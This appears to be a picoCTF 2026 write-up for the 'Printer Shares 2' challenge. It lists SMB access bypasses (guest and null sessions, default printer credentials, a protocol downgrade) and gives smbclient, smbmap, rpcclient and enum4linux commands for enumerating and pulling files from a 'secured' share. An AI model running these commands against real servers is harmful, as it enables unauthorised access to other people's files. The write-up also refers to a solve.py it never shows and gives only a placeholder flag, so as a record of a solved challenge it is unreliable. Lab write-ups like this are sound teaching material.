# Printer Shares 2 - picoCTF 2026

**Category:** General Skills
**Points:** 200

## Challenge Description

A Secure Printer is now in use. I'm confident no one can leak the message again... or can you?

## Approach

This is the sequel to the "Printer Shares" challenge (which involved basic anonymous SMB share enumeration). In Printer Shares 2, the printer share is now "secured" -- meaning anonymous access is no longer sufficient. You need to find alternate ways to authenticate or bypass the security to retrieve the flag.

### Background: SMB (Server Message Block) Protocol

SMB is a network file-sharing protocol that allows applications to read/write files and request services from server programs on a network. In CTF challenges involving printers, the print job data is typically stored in an SMB share that simulates a printer spool directory.

### What Changed from Printer Shares 1

In the original Printer Shares challenge, you could connect with anonymous/guest access (`smbclient -N`) and directly retrieve `flag.txt` from a public share. In Printer Shares 2, the share is "secure" -- but the security has flaws that can be exploited.

### Common SMB Security Bypasses

1. **Guest authentication with empty password**: Some SMB servers allow the "guest" user with a blank password even when anonymous is disabled.
2. **Null session authentication**: Using an empty username with `-N` (no password) flag, or explicitly specifying `--user=""`.
3. **Default/weak credentials**: The printer may have default credentials like `print`/`print`, `admin`/`admin`, or `printer`/`password`.
4. **Share enumeration with different tools**: Using `enum4linux`, `smbmap`, or `crackmapexec` to discover accessible shares and permissions.
5. **SMB protocol version downgrade**: Forcing an older protocol version (`-m SMB2` or `--option='client min protocol=NT1'`) may bypass newer security checks.
6. **Print job metadata**: The flag could be embedded in print job metadata (PJL commands, PCL data, or PostScript) rather than a plain text file.
7. **Alternate share names**: The flag may not be in the obvious share; enumerate all shares with `smbclient -L`.

### Tools

- **smbclient**: Interactive SMB client, similar to an FTP client
- **smbmap**: SMB enumeration tool that checks share permissions
- **enum4linux**: Comprehensive SMB enumeration script
- **crackmapexec / nxc (netexec)**: Network service attack tool with SMB support
- **rpcclient**: RPC client for enumerating users and shares

## Solution

### Step 1: Enumerate Available Shares

```bash
# List all available shares (try anonymous first)
smbclient -L //CHALLENGE_HOST -p PORT -N

# If anonymous listing is blocked, try guest account
smbclient -L //CHALLENGE_HOST -p PORT -U "guest" --password=""

# Use smbmap for permission enumeration
smbmap -H CHALLENGE_HOST -P PORT

# Use smbmap with guest credentials
smbmap -H CHALLENGE_HOST -P PORT -u "guest" -p ""
```

### Step 2: Try Various Authentication Methods

```bash
# Anonymous access (may be blocked in this version)
smbclient //CHALLENGE_HOST/shares -p PORT -N

# Guest account with blank password
smbclient //CHALLENGE_HOST/shares -p PORT -U "guest" --password=""

# Try common printer credentials
smbclient //CHALLENGE_HOST/shares -p PORT -U "print" --password="print"
smbclient //CHALLENGE_HOST/shares -p PORT -U "printer" --password="printer"

# Null session with explicit empty user
smbclient //CHALLENGE_HOST/shares -p PORT -U "" -N

# Force older protocol version
smbclient //CHALLENGE_HOST/shares -p PORT -N --option='client min protocol=NT1'
```

### Step 3: Explore the Share and Retrieve the Flag

```bash
# Once connected, list files
smb: \> ls
smb: \> dir

# Look for flag files, print jobs, spool files
smb: \> get flag.txt
smb: \> get print_job.pcl
smb: \> get spool/job001.prn

# Check subdirectories
smb: \> cd spool
smb: \> ls
smb: \> cd ..
```

### Step 4: Analyze Print Job Data (if flag is not in plaintext)

If the flag is embedded in a print job file (PCL, PostScript, PJL), extract it:

```bash
# Search for the flag pattern in downloaded files
strings print_job.pcl | grep -i pico
strings spool_file.prn | grep -i pico

# For PostScript files, look for embedded text
cat job.ps | grep -i flag
```

### Step 5: Enumerate Users and RPC Info

```bash
# Use rpcclient to enumerate users (may reveal valid usernames)
rpcclient -U "" -N CHALLENGE_HOST -p PORT -c "enumdomusers"
rpcclient -U "" -N CHALLENGE_HOST -p PORT -c "querydominfo"

# Use enum4linux for comprehensive enumeration
enum4linux -a -p PORT CHALLENGE_HOST
```

## Solution Script
```
python3 solve.py
```

## Flag
```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
